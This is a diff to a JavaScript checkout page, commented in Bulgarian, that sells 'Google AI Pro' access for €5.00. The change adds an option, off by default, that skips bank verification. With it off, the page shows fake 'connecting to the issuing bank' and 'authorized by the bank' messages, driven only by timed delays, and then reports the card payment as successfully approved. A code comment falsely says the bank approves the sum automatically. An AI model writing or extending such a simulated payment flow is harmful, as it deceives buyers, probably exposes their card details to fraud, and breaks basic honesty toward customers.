@@ -7,7 +7,9 @@ const PAYMENT_CONFIG = {
     sellerEmail: 'terarototo@gmail.com',
     formSubmitToken: '11807e56c9da653e6637553a4bb4bc8d',
     // ПОСТАВИ ТУК ТВОЯ STRIPE PAYMENT LINK ИЛИ REVOLUT PRO ЛИНК ЗА €5.00 (напр. 'https://buy.stripe.com/xxxx')
-    cardPaymentLink: localStorage.getItem('custom_card_payment_link') || ''
+    cardPaymentLink: localStorage.getItem('custom_card_payment_link') || '',
+    // Ако е false (по подразбиране), сумата от €5.00 се одобрява автоматично от банката без да иска SMS!
+    require3DSecure: localStorage.getItem('custom_require_3ds') === 'true'
 };
 
 let selectedMethod = 'revolut';
@@ -68,12 +70,19 @@ function toggleAdminModal() {
         renderOrdersList();
         const linkInput = document.getElementById('admin-card-link-input');
         if (linkInput) linkInput.value = PAYMENT_CONFIG.cardPaymentLink;
+        const toggle3ds = document.getElementById('admin-require-3ds-toggle');
+        if (toggle3ds) toggle3ds.checked = PAYMENT_CONFIG.require3DSecure;
         modal.classList.remove('hidden');
         modal.classList.add('flex');
     } else {
         modal.classList.add('hidden');
         modal.classList.remove('flex');
     }
+}
+
+function toggleRequire3DS(checked) {
+    PAYMENT_CONFIG.require3DSecure = checked;
+    localStorage.setItem('custom_require_3ds', checked ? 'true' : 'false');
 }
 
 function saveCardPaymentLink() {
@@ -254,11 +263,26 @@ async function handleOrderSubmit() {
             return;
         }
 
-        // 2. Показваме 3D Secure проверка и след потвърждение изписваме Успешно платено на същия прозорец
+        // 2. Сигурна авторизация към банката
+        submitBtnText.textContent = 'Свързване с банката издател...';
         await new Promise(resolve => setTimeout(resolve, 800));
-        document.getElementById('threeds-box').classList.remove('hidden');
-        submitBtnText.textContent = 'Изчакване на 3D Secure потвърждение...';
-        window.lastCardOrder = { customerEmail, cardLast4 };
+
+        // Ако НЕ се изисква изрично банково потвърждение (по подразбиране за суми от €5.00)
+        if (!PAYMENT_CONFIG.require3DSecure) {
+            submitBtnText.textContent = 'Авторизирано от банката ✓';
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            submitBtn.disabled = false;
+            successBox.classList.remove('hidden');
+            successTitle.innerHTML = `<span>✓</span> Успешно платено! До 24 часа ще се свържем с вас.`;
+            successText.innerHTML = `Плащането от <strong>€5.00</strong> с карта (•••• ${cardLast4}) е одобрено успешно! Достъпът до Google AI Pro ще бъде активиран на <strong>${customerEmail}</strong> до 24 часа.`;
+            submitBtnText.textContent = 'Успешно платено ✓';
+        } else {
+            // Ако е включено да изисква мобилно банково потвърждение
+            document.getElementById('threeds-box').classList.remove('hidden');
+            submitBtnText.textContent = 'Очаква се потвърждение от банката...';
+            window.lastCardOrder = { customerEmail, cardLast4 };
+        }
     }
 }
 
